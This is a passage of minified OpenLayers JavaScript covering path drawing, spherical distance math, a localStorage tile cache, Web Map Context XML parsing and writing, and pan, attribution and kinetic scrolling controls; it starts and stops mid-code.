this.persist&&this.destroyPersistedFeature(),this.maxVertices&&this.line&&this.line.geometry.components.length===\nthis.maxVertices?(this.removePoint(),this.finalize()):this.addPoint(a.xy),!1;this.touch||this.mouseDown&&!this.stoppedDown||this.modifyFeature(a.xy,!!this.lastUp);return!0},up:function(a){!this.mouseDown||this.lastUp&&this.lastUp.equals(a.xy)||(this.stoppedDown&&this.freehandMode(a)?(this.persist&&this.destroyPersistedFeature(),this.removePoint(),this.finalize()):this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance)&&(this.touch&&this.modifyFeature(a.xy),null==this.lastUp&&this.persist&&this.destroyPersistedFeature(),\nthis.addPoint(a.xy),this.lastUp=a.xy,this.line.geometry.components.length===this.maxVertices+1&&this.finishGeometry()));this.stoppedDown=this.stopDown;this.mouseDown=!1;return!this.stopUp},finishGeometry:function(){this.line.geometry.removeComponent(this.line.geometry.components[this.line.geometry.components.length-1]);this.removePoint();this.finalize()},dblclick:function(a){this.freehandMode(a)||this.finishGeometry();return!1},CLASS_NAME:\"OpenLayers.Handler.Path\"});OpenLayers.Spherical=OpenLayers.Spherical||{};OpenLayers.Spherical.DEFAULT_RADIUS=6378137;OpenLayers.Spherical.computeDistanceBetween=function(a,b,c){c=c||OpenLayers.Spherical.DEFAULT_RADIUS;var d=Math.sin(Math.PI*(b.lon-a.lon)/360),e=Math.sin(Math.PI*(b.lat-a.lat)/360);a=e*e+d*d*Math.cos(Math.PI*a.lat/180)*Math.cos(Math.PI*b.lat/180);return 2*c*Math.atan2(Math.sqrt(a),Math.sqrt(1-a))};\nOpenLayers.Spherical.computeHeading=function(a,b){var c=Math.sin(Math.PI*(a.lon-b.lon)/180)*Math.cos(Math.PI*b.lat/180),d=Math.cos(Math.PI*a.lat/180)*Math.sin(Math.PI*b.lat/180)-Math.sin(Math.PI*a.lat/180)*Math.cos(Math.PI*b.lat/180)*Math.cos(Math.PI*(a.lon-b.lon)/180);return 180*Math.atan2(c,d)/Math.PI};OpenLayers.Control.CacheWrite=OpenLayers.Class(OpenLayers.Control,{layers:null,imageFormat:\"image/png\",quotaRegEx:/quota/i,setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);var b,c=this.layers||a.layers;for(b=c.length-1;0<=b;--b)this.addLayer({layer:c[b]});if(!this.layers)a.events.on({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this})},addLayer:function(a){a.layer.events.on({tileloadstart:this.makeSameOrigin,tileloaded:this.onTileLoaded,scope:this})},removeLayer:function(a){a.layer.events.un({tileloadstart:this.makeSameOrigin,\ntileloaded:this.onTileLoaded,scope:this})},makeSameOrigin:function(a){if(this.active&&(a=a.tile,a instanceof OpenLayers.Tile.Image&&!a.crossOriginKeyword&&\"data:\"!==a.url.substr(0,5))){var b=OpenLayers.Request.makeSameOrigin(a.url,OpenLayers.ProxyHost);OpenLayers.Control.CacheWrite.urlMap[b]=a.url;a.url=b}},onTileLoaded:function(a){this.active&&(!a.aborted&&a.tile instanceof OpenLayers.Tile.Image&&\"data:\"!==a.tile.url.substr(0,5))&&(this.cache({tile:a.tile}),delete OpenLayers.Control.CacheWrite.urlMap[a.tile.url])},\ncache:function(a){if(window.localStorage){a=a.tile;try{var b=a.getCanvasContext();b&&window.localStorage.setItem(\"olCache_\"+(OpenLayers.Control.CacheWrite.urlMap[a.url]||a.url),b.canvas.toDataURL(this.imageFormat))}catch(c){(b=c.name||c.message)&&this.quotaRegEx.test(b)?this.events.triggerEvent(\"cachefull\",{tile:a}):OpenLayers.Console.error(c.toString())}}},destroy:function(){if(this.layers||this.map){var a,b=this.layers||this.map.layers;for(a=b.length-1;0<=a;--a)this.removeLayer({layer:b[a]})}this.map&&\nthis.map.events.un({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this});OpenLayers.Control.prototype.destroy.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Control.CacheWrite\"});OpenLayers.Control.CacheWrite.clearCache=function(){if(window.localStorage){var a,b;for(a=window.localStorage.length-1;0<=a;--a)b=window.localStorage.key(a),\"olCache_\"===b.substr(0,8)&&window.localStorage.removeItem(b)}};OpenLayers.Control.CacheWrite.urlMap={};OpenLayers.Format.Context=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{layerOptions:null,layerParams:null,read:function(a,b){var c=OpenLayers.Format.XML.VersionedOGC.prototype.read.apply(this,arguments);if(b&&b.map)if(this.context=c,b.map instanceof OpenLayers.Map)c=this.mergeContextToMap(c,b.map);else{var d=b.map;if(OpenLayers.Util.isElement(d)||\"string\"==typeof d)d={div:d};c=this.contextToMap(c,d)}return c},getLayerFromContext:function(a){var b,c,d={queryable:a.queryable,visibility:a.visibility,\nmaxExtent:a.maxExtent,metadata:OpenLayers.Util.applyDefaults(a.metadata,{styles:a.styles,formats:a.formats,\"abstract\":a[\"abstract\"],dataURL:a.dataURL}),numZoomLevels:a.numZoomLevels,units:a.units,isBaseLayer:a.isBaseLayer,opacity:a.opacity,displayInLayerSwitcher:a.displayInLayerSwitcher,singleTile:a.singleTile,tileSize:a.tileSize?new OpenLayers.Size(a.tileSize.width,a.tileSize.height):void 0,minScale:a.minScale||a.maxScaleDenominator,maxScale:a.maxScale||a.minScaleDenominator,srs:a.srs,dimensions:a.dimensions,\nmetadataURL:a.metadataURL};this.layerOptions&&OpenLayers.Util.applyDefaults(d,this.layerOptions);var e={layers:a.name,transparent:a.transparent,version:a.version};if(a.formats&&0<a.formats.length)for(e.format=a.formats[0].value,b=0,c=a.formats.length;b<c;b++){var f=a.formats[b];if(!0==f.current){e.format=f.value;break}}if(a.styles&&0<a.styles.length)for(b=0,c=a.styles.length;b<c;b++)if(f=a.styles[b],!0==f.current){f.href?e.sld=f.href:f.body?e.sld_body=f.body:e.styles=f.name;break}this.layerParams&&\nOpenLayers.Util.applyDefaults(e,this.layerParams);b=null;c=a.service;c==OpenLayers.Format.Context.serviceTypes.WFS?(d.strategies=[new OpenLayers.Strategy.BBOX],d.protocol=new OpenLayers.Protocol.WFS({url:a.url,featurePrefix:a.name.split(\":\")[0],featureType:a.name.split(\":\").pop()}),b=new OpenLayers.Layer.Vector(a.title||a.name,d)):c==OpenLayers.Format.Context.serviceTypes.KML?(d.strategies=[new OpenLayers.Strategy.Fixed],d.protocol=new OpenLayers.Protocol.HTTP({url:a.url,format:new OpenLayers.Format.KML}),\nb=new OpenLayers.Layer.Vector(a.title||a.name,d)):c==OpenLayers.Format.Context.serviceTypes.GML?(d.strategies=[new OpenLayers.Strategy.Fixed],d.protocol=new OpenLayers.Protocol.HTTP({url:a.url,format:new OpenLayers.Format.GML}),b=new OpenLayers.Layer.Vector(a.title||a.name,d)):a.features?(b=new OpenLayers.Layer.Vector(a.title||a.name,d),b.addFeatures(a.features)):!0!==a.categoryLayer&&(b=new OpenLayers.Layer.WMS(a.title||a.name,a.url,e,d));return b},getLayersFromContext:function(a){for(var b=[],c=\n0,d=a.length;c<d;c++){var e=this.getLayerFromContext(a[c]);null!==e&&b.push(e)}return b},contextToMap:function(a,b){b=OpenLayers.Util.applyDefaults({maxExtent:a.maxExtent,projection:a.projection,units:a.units},b);b.maxExtent&&(b.maxResolution=b.maxExtent.getWidth()/OpenLayers.Map.TILE_WIDTH);b.metadata={contactInformation:a.contactInformation,\"abstract\":a[\"abstract\"],keywords:a.keywords,logo:a.logo,descriptionURL:a.descriptionURL};var c=new OpenLayers.Map(b);c.addLayers(this.getLayersFromContext(a.layersContext));\nc.setCenter(a.bounds.getCenterLonLat(),c.getZoomForExtent(a.bounds,!0));return c},mergeContextToMap:function(a,b){b.addLayers(this.getLayersFromContext(a.layersContext));return b},write:function(a,b){a=this.toContext(a);return OpenLayers.Format.XML.VersionedOGC.prototype.write.apply(this,arguments)},CLASS_NAME:\"OpenLayers.Format.Context\"});\nOpenLayers.Format.Context.serviceTypes={WMS:\"urn:ogc:serviceType:WMS\",WFS:\"urn:ogc:serviceType:WFS\",WCS:\"urn:ogc:serviceType:WCS\",GML:\"urn:ogc:serviceType:GML\",SLD:\"urn:ogc:serviceType:SLD\",FES:\"urn:ogc:serviceType:FES\",KML:\"urn:ogc:serviceType:KML\"};OpenLayers.Format.WMC=OpenLayers.Class(OpenLayers.Format.Context,{defaultVersion:\"1.1.0\",layerToContext:function(a){var b=this.getParser(),c={queryable:a.queryable,visibility:a.visibility,name:a.params.LAYERS,title:a.name,\"abstract\":a.metadata[\"abstract\"],dataURL:a.metadata.dataURL,metadataURL:a.metadataURL,server:{version:a.params.VERSION,url:a.url},maxExtent:a.maxExtent,transparent:a.params.TRANSPARENT,numZoomLevels:a.numZoomLevels,units:a.units,isBaseLayer:a.isBaseLayer,opacity:1==a.opacity?void 0:\na.opacity,displayInLayerSwitcher:a.displayInLayerSwitcher,singleTile:a.singleTile,tileSize:a.singleTile||!a.tileSize?void 0:{width:a.tileSize.w,height:a.tileSize.h},minScale:a.options.resolutions||a.options.scales||a.options.maxResolution||a.options.minScale?a.minScale:void 0,maxScale:a.options.resolutions||a.options.scales||a.options.minResolution||a.options.maxScale?a.maxScale:void 0,formats:[],styles:[],srs:a.srs,dimensions:a.dimensions};a.metadata.servertitle&&(c.server.title=a.metadata.servertitle);\nif(a.metadata.formats&&0<a.metadata.formats.length)for(var d=0,e=a.metadata.formats.length;d<e;d++){var f=a.metadata.formats[d];c.formats.push({value:f.value,current:f.value==a.params.FORMAT})}else c.formats.push({value:a.params.FORMAT,current:!0});if(a.metadata.styles&&0<a.metadata.styles.length)for(d=0,e=a.metadata.styles.length;d<e;d++)b=a.metadata.styles[d],b.current=b.href==a.params.SLD||b.body==a.params.SLD_BODY||b.name==a.params.STYLES?!0:!1,c.styles.push(b);else c.styles.push({href:a.params.SLD,\nbody:a.params.SLD_BODY,name:a.params.STYLES||b.defaultStyleName,title:b.defaultStyleTitle,current:!0});return c},toContext:function(a){var b={},c=a.layers;if(\"OpenLayers.Map\"==a.CLASS_NAME){var d=a.metadata||{};b.size=a.getSize();b.bounds=a.getExtent();b.projection=a.projection;b.title=a.title;b.keywords=d.keywords;b[\"abstract\"]=d[\"abstract\"];b.logo=d.logo;b.descriptionURL=d.descriptionURL;b.contactInformation=d.contactInformation;b.maxExtent=a.maxExtent}else OpenLayers.Util.applyDefaults(b,a),void 0!=\nb.layers&&delete b.layers;void 0==b.layersContext&&(b.layersContext=[]);if(void 0!=c&&OpenLayers.Util.isArray(c))for(a=0,d=c.length;a<d;a++){var e=c[a];e instanceof OpenLayers.Layer.WMS&&b.layersContext.push(this.layerToContext(e))}return b},CLASS_NAME:\"OpenLayers.Format.WMC\"});OpenLayers.Format.WMC.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ol:\"http://openlayers.org/context\",wmc:\"http://www.opengis.net/context\",sld:\"http://www.opengis.net/sld\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},schemaLocation:\"\",getNamespacePrefix:function(a){var b=null;if(null==a)b=this.namespaces[this.defaultPrefix];else for(b in this.namespaces)if(this.namespaces[b]==a)break;return b},defaultPrefix:\"wmc\",rootPrefix:null,defaultStyleName:\"\",\ndefaultStyleTitle:\"Default\",initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a=a.documentElement;this.rootPrefix=a.prefix;var b={version:a.getAttribute(\"version\")};this.runChildNodes(b,a);return b},runChildNodes:function(a,b){for(var c=b.childNodes,d,e,f,g=0,h=c.length;g<h;++g)d=c[g],1==d.nodeType&&(e=this.getNamespacePrefix(d.namespaceURI),f=d.nodeName.split(\":\").pop(),\n(e=this[\"read_\"+e+\"_\"+f])&&e.apply(this,[a,d]))},read_wmc_General:function(a,b){this.runChildNodes(a,b)},read_wmc_BoundingBox:function(a,b){a.projection=b.getAttribute(\"SRS\");a.bounds=new OpenLayers.Bounds(b.getAttribute(\"minx\"),b.getAttribute(\"miny\"),b.getAttribute(\"maxx\"),b.getAttribute(\"maxy\"))},read_wmc_LayerList:function(a,b){a.layersContext=[];this.runChildNodes(a,b)},read_wmc_Layer:function(a,b){var c={visibility:\"1\"!=b.getAttribute(\"hidden\"),queryable:\"1\"==b.getAttribute(\"queryable\"),formats:[],\nstyles:[],metadata:{}};this.runChildNodes(c,b);a.layersContext.push(c)},read_wmc_Extension:function(a,b){this.runChildNodes(a,b)},read_ol_units:function(a,b){a.units=this.getChildValue(b)},read_ol_maxExtent:function(a,b){var c=new OpenLayers.Bounds(b.getAttribute(\"minx\"),b.getAttribute(\"miny\"),b.getAttribute(\"maxx\"),b.getAttribute(\"maxy\"));a.maxExtent=c},read_ol_transparent:function(a,b){a.transparent=this.getChildValue(b)},read_ol_numZoomLevels:function(a,b){a.numZoomLevels=parseInt(this.getChildValue(b))},\nread_ol_opacity:function(a,b){a.opacity=parseFloat(this.getChildValue(b))},read_ol_singleTile:function(a,b){a.singleTile=\"true\"==this.getChildValue(b)},read_ol_tileSize:function(a,b){var c={width:b.getAttribute(\"width\"),height:b.getAttribute(\"height\")};a.tileSize=c},read_ol_isBaseLayer:function(a,b){a.isBaseLayer=\"true\"==this.getChildValue(b)},read_ol_displayInLayerSwitcher:function(a,b){a.displayInLayerSwitcher=\"true\"==this.getChildValue(b)},read_wmc_Server:function(a,b){a.version=b.getAttribute(\"version\");\na.url=this.getOnlineResource_href(b);a.metadata.servertitle=b.getAttribute(\"title\")},read_wmc_FormatList:function(a,b){this.runChildNodes(a,b)},read_wmc_Format:function(a,b){var c={value:this.getChildValue(b)};\"1\"==b.getAttribute(\"current\")&&(c.current=!0);a.formats.push(c)},read_wmc_StyleList:function(a,b){this.runChildNodes(a,b)},read_wmc_Style:function(a,b){var c={};this.runChildNodes(c,b);\"1\"==b.getAttribute(\"current\")&&(c.current=!0);a.styles.push(c)},read_wmc_SLD:function(a,b){this.runChildNodes(a,\nb)},read_sld_StyledLayerDescriptor:function(a,b){var c=OpenLayers.Format.XML.prototype.write.apply(this,[b]);a.body=c},read_sld_FeatureTypeStyle:function(a,b){var c=OpenLayers.Format.XML.prototype.write.apply(this,[b]);a.body=c},read_wmc_OnlineResource:function(a,b){a.href=this.getAttributeNS(b,this.namespaces.xlink,\"href\")},read_wmc_Name:function(a,b){var c=this.getChildValue(b);c&&(a.name=c)},read_wmc_Title:function(a,b){var c=this.getChildValue(b);c&&(a.title=c)},read_wmc_MetadataURL:function(a,\nb){a.metadataURL=this.getOnlineResource_href(b)},read_wmc_KeywordList:function(a,b){a.keywords=[];this.runChildNodes(a.keywords,b)},read_wmc_Keyword:function(a,b){a.push(this.getChildValue(b))},read_wmc_Abstract:function(a,b){var c=this.getChildValue(b);c&&(a[\"abstract\"]=c)},read_wmc_LogoURL:function(a,b){a.logo={width:b.getAttribute(\"width\"),height:b.getAttribute(\"height\"),format:b.getAttribute(\"format\"),href:this.getOnlineResource_href(b)}},read_wmc_DescriptionURL:function(a,b){a.descriptionURL=\nthis.getOnlineResource_href(b)},read_wmc_ContactInformation:function(a,b){var c={};this.runChildNodes(c,b);a.contactInformation=c},read_wmc_ContactPersonPrimary:function(a,b){var c={};this.runChildNodes(c,b);a.personPrimary=c},read_wmc_ContactPerson:function(a,b){var c=this.getChildValue(b);c&&(a.person=c)},read_wmc_ContactOrganization:function(a,b){var c=this.getChildValue(b);c&&(a.organization=c)},read_wmc_ContactPosition:function(a,b){var c=this.getChildValue(b);c&&(a.position=c)},read_wmc_ContactAddress:function(a,\nb){var c={};this.runChildNodes(c,b);a.contactAddress=c},read_wmc_AddressType:function(a,b){var c=this.getChildValue(b);c&&(a.type=c)},read_wmc_Address:function(a,b){var c=this.getChildValue(b);c&&(a.address=c)},read_wmc_City:function(a,b){var c=this.getChildValue(b);c&&(a.city=c)},read_wmc_StateOrProvince:function(a,b){var c=this.getChildValue(b);c&&(a.stateOrProvince=c)},read_wmc_PostCode:function(a,b){var c=this.getChildValue(b);c&&(a.postcode=c)},read_wmc_Country:function(a,b){var c=this.getChildValue(b);\nc&&(a.country=c)},read_wmc_ContactVoiceTelephone:function(a,b){var c=this.getChildValue(b);c&&(a.phone=c)},read_wmc_ContactFacsimileTelephone:function(a,b){var c=this.getChildValue(b);c&&(a.fax=c)},read_wmc_ContactElectronicMailAddress:function(a,b){var c=this.getChildValue(b);c&&(a.email=c)},read_wmc_DataURL:function(a,b){a.dataURL=this.getOnlineResource_href(b)},read_wmc_LegendURL:function(a,b){var c={width:b.getAttribute(\"width\"),height:b.getAttribute(\"height\"),format:b.getAttribute(\"format\"),\nhref:this.getOnlineResource_href(b)};a.legend=c},read_wmc_DimensionList:function(a,b){a.dimensions={};this.runChildNodes(a.dimensions,b)},read_wmc_Dimension:function(a,b){var c={name:b.getAttribute(\"name\").toLowerCase(),units:b.getAttribute(\"units\")||\"\",unitSymbol:b.getAttribute(\"unitSymbol\")||\"\",userValue:b.getAttribute(\"userValue\")||\"\",nearestValue:\"1\"===b.getAttribute(\"nearestValue\"),multipleValues:\"1\"===b.getAttribute(\"multipleValues\"),current:\"1\"===b.getAttribute(\"current\"),\"default\":b.getAttribute(\"default\")||\n\"\"},d=this.getChildValue(b);c.values=d.split(\",\");a[c.name]=c},write:function(a,b){var c=this.createElementDefaultNS(\"ViewContext\");this.setAttributes(c,{version:this.VERSION,id:b&&\"string\"==typeof b.id?b.id:OpenLayers.Util.createUniqueID(\"OpenLayers_Context_\")});this.setAttributeNS(c,this.namespaces.xsi,\"xsi:schemaLocation\",this.schemaLocation);c.appendChild(this.write_wmc_General(a));c.appendChild(this.write_wmc_LayerList(a));return OpenLayers.Format.XML.prototype.write.apply(this,[c])},createElementDefaultNS:function(a,\nb,c){a=this.createElementNS(this.namespaces[this.defaultPrefix],a);b&&a.appendChild(this.createTextNode(b));c&&this.setAttributes(a,c);return a},setAttributes:function(a,b){var c,d;for(d in b)c=b[d].toString(),c.match(/[A-Z]/)?this.setAttributeNS(a,null,d,c):a.setAttribute(d,c)},write_wmc_General:function(a){var b=this.createElementDefaultNS(\"General\");a.size&&b.appendChild(this.createElementDefaultNS(\"Window\",null,{width:a.size.w,height:a.size.h}));var c=a.bounds;b.appendChild(this.createElementDefaultNS(\"BoundingBox\",\nnull,{minx:c.left.toPrecision(18),miny:c.bottom.toPrecision(18),maxx:c.right.toPrecision(18),maxy:c.top.toPrecision(18),SRS:a.projection}));b.appendChild(this.createElementDefaultNS(\"Title\",a.title));a.keywords&&b.appendChild(this.write_wmc_KeywordList(a.keywords));a[\"abstract\"]&&b.appendChild(this.createElementDefaultNS(\"Abstract\",a[\"abstract\"]));a.logo&&b.appendChild(this.write_wmc_URLType(\"LogoURL\",a.logo.href,a.logo));a.descriptionURL&&b.appendChild(this.write_wmc_URLType(\"DescriptionURL\",a.descriptionURL));\na.contactInformation&&b.appendChild(this.write_wmc_ContactInformation(a.contactInformation));b.appendChild(this.write_ol_MapExtension(a));return b},write_wmc_KeywordList:function(a){for(var b=this.createElementDefaultNS(\"KeywordList\"),c=0,d=a.length;c<d;c++)b.appendChild(this.createElementDefaultNS(\"Keyword\",a[c]));return b},write_wmc_ContactInformation:function(a){var b=this.createElementDefaultNS(\"ContactInformation\");a.personPrimary&&b.appendChild(this.write_wmc_ContactPersonPrimary(a.personPrimary));\na.position&&b.appendChild(this.createElementDefaultNS(\"ContactPosition\",a.position));a.contactAddress&&b.appendChild(this.write_wmc_ContactAddress(a.contactAddress));a.phone&&b.appendChild(this.createElementDefaultNS(\"ContactVoiceTelephone\",a.phone));a.fax&&b.appendChild(this.createElementDefaultNS(\"ContactFacsimileTelephone\",a.fax));a.email&&b.appendChild(this.createElementDefaultNS(\"ContactElectronicMailAddress\",a.email));return b},write_wmc_ContactPersonPrimary:function(a){var b=this.createElementDefaultNS(\"ContactPersonPrimary\");\na.person&&b.appendChild(this.createElementDefaultNS(\"ContactPerson\",a.person));a.organization&&b.appendChild(this.createElementDefaultNS(\"ContactOrganization\",a.organization));return b},write_wmc_ContactAddress:function(a){var b=this.createElementDefaultNS(\"ContactAddress\");a.type&&b.appendChild(this.createElementDefaultNS(\"AddressType\",a.type));a.address&&b.appendChild(this.createElementDefaultNS(\"Address\",a.address));a.city&&b.appendChild(this.createElementDefaultNS(\"City\",a.city));a.stateOrProvince&&\nb.appendChild(this.createElementDefaultNS(\"StateOrProvince\",a.stateOrProvince));a.postcode&&b.appendChild(this.createElementDefaultNS(\"PostCode\",a.postcode));a.country&&b.appendChild(this.createElementDefaultNS(\"Country\",a.country));return b},write_ol_MapExtension:function(a){var b=this.createElementDefaultNS(\"Extension\");if(a=a.maxExtent){var c=this.createElementNS(this.namespaces.ol,\"ol:maxExtent\");this.setAttributes(c,{minx:a.left.toPrecision(18),miny:a.bottom.toPrecision(18),maxx:a.right.toPrecision(18),\nmaxy:a.top.toPrecision(18)});b.appendChild(c)}return b},write_wmc_LayerList:function(a){for(var b=this.createElementDefaultNS(\"LayerList\"),c=0,d=a.layersContext.length;c<d;++c)b.appendChild(this.write_wmc_Layer(a.layersContext[c]));return b},write_wmc_Layer:function(a){var b=this.createElementDefaultNS(\"Layer\",null,{queryable:a.queryable?\"1\":\"0\",hidden:a.visibility?\"0\":\"1\"});b.appendChild(this.write_wmc_Server(a));b.appendChild(this.createElementDefaultNS(\"Name\",a.name));b.appendChild(this.createElementDefaultNS(\"Title\",\na.title));a[\"abstract\"]&&b.appendChild(this.createElementDefaultNS(\"Abstract\",a[\"abstract\"]));a.dataURL&&b.appendChild(this.write_wmc_URLType(\"DataURL\",a.dataURL));a.metadataURL&&b.appendChild(this.write_wmc_URLType(\"MetadataURL\",a.metadataURL));return b},write_wmc_LayerExtension:function(a){var b=this.createElementDefaultNS(\"Extension\"),c=a.maxExtent,d=this.createElementNS(this.namespaces.ol,\"ol:maxExtent\");this.setAttributes(d,{minx:c.left.toPrecision(18),miny:c.bottom.toPrecision(18),maxx:c.right.toPrecision(18),\nmaxy:c.top.toPrecision(18)});b.appendChild(d);a.tileSize&&!a.singleTile&&(c=this.createElementNS(this.namespaces.ol,\"ol:tileSize\"),this.setAttributes(c,a.tileSize),b.appendChild(c));for(var c=\"transparent numZoomLevels units isBaseLayer opacity displayInLayerSwitcher singleTile\".split(\" \"),e=0,f=c.length;e<f;++e)(d=this.createOLPropertyNode(a,c[e]))&&b.appendChild(d);return b},createOLPropertyNode:function(a,b){var c=null;null!=a[b]&&(c=this.createElementNS(this.namespaces.ol,\"ol:\"+b),c.appendChild(this.createTextNode(a[b].toString())));\nreturn c},write_wmc_Server:function(a){a=a.server;var b=this.createElementDefaultNS(\"Server\"),c={service:\"OGC:WMS\",version:a.version};a.title&&(c.title=a.title);this.setAttributes(b,c);b.appendChild(this.write_wmc_OnlineResource(a.url));return b},write_wmc_URLType:function(a,b,c){a=this.createElementDefaultNS(a);a.appendChild(this.write_wmc_OnlineResource(b));if(c){b=[\"width\",\"height\",\"format\"];for(var d=0;d<b.length;d++)b[d]in c&&a.setAttribute(b[d],c[b[d]])}return a},write_wmc_DimensionList:function(a){var b=\nthis.createElementDefaultNS(\"DimensionList\"),c;for(c in a.dimensions){var d={},e=a.dimensions[c],f;for(f in e)d[f]=\"boolean\"==typeof e[f]?Number(e[f]):e[f];e=\"\";d.values&&(e=d.values.join(\",\"),delete d.values);b.appendChild(this.createElementDefaultNS(\"Dimension\",e,d))}return b},write_wmc_FormatList:function(a){for(var b=this.createElementDefaultNS(\"FormatList\"),c=0,d=a.formats.length;c<d;c++){var e=a.formats[c];b.appendChild(this.createElementDefaultNS(\"Format\",e.value,e.current&&!0==e.current?{current:\"1\"}:\nnull))}return b},write_wmc_StyleList:function(a){var b=this.createElementDefaultNS(\"StyleList\");if((a=a.styles)&&OpenLayers.Util.isArray(a))for(var c,d=0,e=a.length;d<e;d++){var f=a[d],g=this.createElementDefaultNS(\"Style\",null,f.current&&!0==f.current?{current:\"1\"}:null);f.href?(c=this.createElementDefaultNS(\"SLD\"),f.name&&c.appendChild(this.createElementDefaultNS(\"Name\",f.name)),f.title&&c.appendChild(this.createElementDefaultNS(\"Title\",f.title)),f.legend&&c.appendChild(this.write_wmc_URLType(\"LegendURL\",\nf.legend.href,f.legend)),f=this.write_wmc_OnlineResource(f.href),c.appendChild(f),g.appendChild(c)):f.body?(c=this.createElementDefaultNS(\"SLD\"),f.name&&c.appendChild(this.createElementDefaultNS(\"Name\",f.name)),f.title&&c.appendChild(this.createElementDefaultNS(\"Title\",f.title)),f.legend&&c.appendChild(this.write_wmc_URLType(\"LegendURL\",f.legend.href,f.legend)),f=OpenLayers.Format.XML.prototype.read.apply(this,[f.body]).documentElement,c.ownerDocument&&c.ownerDocument.importNode&&(f=c.ownerDocument.importNode(f,\n!0)),c.appendChild(f),g.appendChild(c)):(g.appendChild(this.createElementDefaultNS(\"Name\",f.name)),g.appendChild(this.createElementDefaultNS(\"Title\",f.title)),f[\"abstract\"]&&g.appendChild(this.createElementDefaultNS(\"Abstract\",f[\"abstract\"])),f.legend&&g.appendChild(this.write_wmc_URLType(\"LegendURL\",f.legend.href,f.legend)));b.appendChild(g)}return b},write_wmc_OnlineResource:function(a){var b=this.createElementDefaultNS(\"OnlineResource\");this.setAttributeNS(b,this.namespaces.xlink,\"xlink:type\",\n\"simple\");this.setAttributeNS(b,this.namespaces.xlink,\"xlink:href\",a);return b},getOnlineResource_href:function(a){var b={};a=a.getElementsByTagName(\"OnlineResource\");0<a.length&&this.read_wmc_OnlineResource(b,a[0]);return b.href},CLASS_NAME:\"OpenLayers.Format.WMC.v1\"});OpenLayers.Control.PanPanel=OpenLayers.Class(OpenLayers.Control.Panel,{slideFactor:50,slideRatio:null,initialize:function(a){OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);a={slideFactor:this.slideFactor,slideRatio:this.slideRatio};this.addControls([new OpenLayers.Control.Pan(OpenLayers.Control.Pan.NORTH,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.SOUTH,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.EAST,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.WEST,a)])},\nCLASS_NAME:\"OpenLayers.Control.PanPanel\"});OpenLayers.Control.Attribution=OpenLayers.Class(OpenLayers.Control,{separator:\", \",template:\"${layers}\",destroy:function(){this.map.events.un({removelayer:this.updateAttribution,addlayer:this.updateAttribution,changelayer:this.updateAttribution,changebaselayer:this.updateAttribution,scope:this});OpenLayers.Control.prototype.destroy.apply(this,arguments)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.map.events.on({changebaselayer:this.updateAttribution,changelayer:this.updateAttribution,\naddlayer:this.updateAttribution,removelayer:this.updateAttribution,scope:this});this.updateAttribution();return this.div},updateAttribution:function(){var a=[];if(this.map&&this.map.layers){for(var b=0,c=this.map.layers.length;b<c;b++){var d=this.map.layers[b];d.attribution&&d.getVisibility()&&-1===OpenLayers.Util.indexOf(a,d.attribution)&&a.push(d.attribution)}this.div.innerHTML=OpenLayers.String.format(this.template,{layers:a.join(this.separator)})}},CLASS_NAME:\"OpenLayers.Control.Attribution\"});OpenLayers.Kinetic=OpenLayers.Class({threshold:0,deceleration:0.0035,nbPoints:100,delay:200,points:void 0,timerId:void 0,initialize:function(a){OpenLayers.Util.extend(this,a)},begin:function(){OpenLayers.Animation.stop(this.timerId);this.timerId=void 0;this.points=[]},update:function(a){this.points.unshift({xy:a,tick:(new Date).getTime()});this.points.length>this.nbPoints&&this.points.pop()},end:function(a){for(var b,c=(new Date).getTime(),d=0,e=this.points.length,f;d<e;d++){f=this.points[d];if(c-\nf.tick>this.delay)break;b=f}if(b&&(d=(new Date).getTime()-b.tick,c=Math.sqrt(Math.pow(a.x-b.xy.x,2)+Math.pow(a.y-b.xy.y,2)),d=c/d,!(0==d||d<this.threshold)))return c=Math.asin((a.y-b.xy.y)/c),b.xy.x<=a.x&&(c=Math.PI-c),{speed:d,theta:c}},move:function(a,b){var c=a.speed,d=Math.cos(a.theta),e=-Math.sin(a.theta),f=(new Date).getTime(),g=0,h=0;this.timerId=OpenLayers.Animation.start(OpenLayers.Function.bind(function(){if(null!=this.timerId){var a=(new Date).getTime()-f,l=-this.deceleration*Math.pow(a,\n2)/2+c*a,m=l*d,l=l*e,n,p;n=!1;0>=-this.deceleration*a+c&&(OpenLayers.Animation.stop(this.timerId),this.timerId=null,n=!0);a=m-g;p=l-h;g=m;h=l;b(a,p,n)}},this))},CLASS_NAME:\"OpenLayers.Kinetic\"});OpenLayers.Format.WPSExecute=OpenLayers.Class(OpenLayers.Format.XML,OpenLayers.Format.Filter.v1_1_0,{namespaces:{ows:\"http://www.opengis.net/ows/1.1\",gml:\"http://www.opengis.net/gml\",wps:\"http://www.opengis.net/wps/1.0.0\",wfs:\"http://www.opengis.net/wfs\",ogc:\"http://www.opengis.net/ogc\",wcs:\"http://www.opengis.net/wcs\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},VERSION:\"1.0.0\",\nschemaLocation:\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\",schemaLocationAttr:function(a){},write:function(a){var b;window.ActiveXObject?this.xmldom=b=new ActiveXObject(\"Microsoft.XMLDOM\"):b=document.implementation.createDocument(\"\",\"\",null);a=this.writeNode(\"wps:Execute\",a,b);this.setAttributeNS(a,this.namespaces.xsi,\"xsi:schemaLocation\",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},read:function(a){\"string\"==typeof 